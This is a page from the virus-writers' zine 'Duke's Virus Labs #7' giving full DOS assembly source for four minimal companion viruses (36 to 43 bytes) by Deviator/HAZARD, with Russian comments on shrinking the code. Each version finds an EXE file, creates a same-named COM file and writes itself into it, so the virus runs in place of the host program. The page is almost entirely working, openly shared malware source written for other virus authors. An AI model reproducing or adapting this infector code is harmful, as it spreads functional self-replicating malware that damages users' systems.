- [Duke's Virus Labs #7] - [Page 25] -

Companion.36,38,40,43
(c) by Deviator/HAZARD

===== begin mt_s_36.asm =====
; Моя версия самого маленького спутника !
; Размер = 36 байт... Пока я обогнал Duk'a/SMF...

; Некоторые идеи были взяты у Duk'a, однако вирус мой.
; У меня,во время разработки была их целая серия (от 64 байт до 36)

; P.S Вирус нестабилен при не стандартном содержании регистров при запуске
; т.е. должно быть равно Si = 100h,Di=Sp (-2 или 0FFFEh) Ax,Bx,Cx,Dx = 0.

; P.S.S Я тот самый Soulburner,который опубликовал свой вирус в DVL#6.
;  Решил переименноватся в Deviator - смотрю лохов столько развелось,
; у которых фантазии для придумывания своего оригинального Nick'a совсем нет.
;  Я был под прозвищем SoulBurner с 1996, смотрю около двух месяцев тому
; назад,в UnderNet на канале #TeenChat,появился Soulburner из Малазии !
;  Через некоторое время у Mr.Quail (my team member) смотрю программку
; связанную с аккордами для гитары, а там Nick - SoulBurner, да и программа
; датирована 1998 годом. Причем программка на русском языке... Вот падлы !

; У [Hazard] Team открывается HomePage. Когда будет готово,кину link.

; Hi Dukie ! ;)

; Меньше не получается :(

; Deviator [HAZARD]

.model tiny
.386
.code
        org 100h
Mt_38:  db      '*.e*'          ; Наша маска

        mov ah,4eh              ; Ищем файл
        Call Gotcha
Gotcha: mov dx,si               ; Dx = 100h
        int 21h                 ; Dos

        mov dx,9Eh              ; Dx = 9Eh
        mov ax,5B00h+'.'        ; Ищем '.'
repne   scasb                   ; Lets Go
        mov [di],'MOC'          ; Меняем расширение на COM

        mov cx,si               ; Cx = 256 (100h)
        int 21h                 ; Ah = 5B,создать файл если не существует
        xchg ax,bx              ; Handle в Bx
        mov ah,40h              ; Пишим нас
        ret                     ; На Gotcha
end     Mt_38
===== end   mt_s_36.asm =====

===== begin mt_s_38.asm =====
.model tiny
.386
.code
        org 100h
main:   db      '*.e*'
        mov dx,si

        mov ah,4eh
        int 21h

        mov dx,9Eh

        mov ax,5B00h+'.'
repne   scasb
        mov ds:[di],00000000+'MOC'

        mov cx,si
        Call XXX
XXX:    int 21h
        xchg ax,bx
        mov ah,40h
        mov dx,si
        ret
end     main
===== end   mt_s_38.asm =====

===== begin mt_s_40.asm =====
.model tiny
.386
.code
        org 100h
main:   db      '*.e*'
        mov dx,si

        mov ah,4eh
        int 21h

        mov di,9Eh


        push di
        mov ax,5B00h+'.'
repne   scasb
        mov ds:[di],00000000+'MOC'
        pop  dx

        mov cx,si
        Call XXX
XXX:    int 21h
        xchg ax,bx
        mov ah,40h
        mov dx,si
        ret
end     main
===== end   mt_s_40.asm =====

===== begin mt_s_43.asm =====
.model tiny
.386
.code
        org 100h
main:   db      '*.e*'
        mov dx,100h
        mov bp,dx

        mov ah,4eh
        int 21h

        mov di,9Eh


        push di
        mov ax,5B00h+'.'
repne   scasb
        mov ds:[di],00000000+'MOC'
        pop  dx

        mov cx,bp
        Call XXX
XXX:    int 21h
        xchg ax,bx
        mov ah,40h
        mov dx,bp
        ret
end     main
===== end   mt_s_43.asm =====
